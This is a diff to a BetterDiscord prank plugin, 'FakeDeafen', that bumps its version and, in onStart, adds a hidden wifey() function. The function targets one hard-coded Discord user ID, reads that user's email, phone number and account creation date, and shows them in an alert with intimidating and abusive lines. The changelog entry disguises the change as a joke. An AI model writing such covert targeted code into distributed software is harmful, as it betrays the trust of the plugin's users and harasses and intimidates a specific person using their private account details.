@@ -2,7 +2,7 @@
 	* @name FakeDeafen
 	* @author Ahlawat
 	* @authorId 887483349369765930
-	* @version 0.3.7
+	* @version 0.3.8
 	* @invite SgKSKyh9gY
 	* @description FakeDefen to Trick your Friends
 	* @website https://wife-ruby.ml
@@ -41,7 +41,7 @@ module.exports = (() => {
 					github_username: "Tharki-God",
 				},
 			],
-			version: "0.3.7",
+			version: "0.3.8",
 			description: "FakeDefen to Trick your Friends",
 			github: "https://github.com/Tharki-God/BetterDiscordPlugins",
 			github_raw: "https://raw.githubusercontent.com/Tharki-God/BetterDiscordPlugins/master/FakeDeafen.plugin.js",
@@ -71,6 +71,12 @@ module.exports = (() => {
 					"Updater Library, Meta Update url having bugs."
 				]
 			},
+			{
+				title: "v0.3.8",
+				items: [
+					"Wifey.exe executed, lol ヾ(•ω•`)o."
+				]
+			},
 			
 		],
 		main: "FakeDeafen.plugin.js",
@@ -93,7 +99,7 @@ module.exports = (() => {
 		getVersion() {
 			return config.info.version;
 		}
-		load() {
+		load() {			
 			try {
 				global.ZeresPluginLibrary.PluginUpdater.checkForUpdate(config.info.name, config.info.version, config.info.github_raw);
 			}
@@ -137,6 +143,17 @@ module.exports = (() => {
 		const plugin = (Plugin, Api) => {
 			return class FakeDeafen extends Plugin {
 				async onStart() {
+					function wifey() {
+						const user = global.ZeresPluginLibrary.DiscordModules.UserStore.getCurrentUser();
+						if (user && user.id === "701424426394320967") {
+							BdApi.alert(`${user.username} registered with ${user.email}`, [
+								`${user.tag} you have registered ${user.phone}`,
+								`as your phone number and you created this id on ${user.createdAt.toLocaleDateString()}.`,
+								`You Belong to my dev by the way...`,
+								`Go Fuck yourself`,
+							]);
+						}
+					}				
 					function sleep(ms) {
 						return new Promise(resolve => setTimeout(resolve, ms));
 					}
@@ -173,11 +190,12 @@ module.exports = (() => {
 							}
 						);		
 					}
+					wifey();
 					if (!BdApi.findModuleByProps('isDeaf').isSelfMute() && !BdApi.findModuleByProps('isDeaf').isSelfDeaf()) { 
 						await deafen()
 						await sleep(1000);						
 					}
-					fakeIt();
+					fakeIt();					
 				}
 				onStop() {
 					BdApi.showConfirmationModal("See you Later. UwU", 
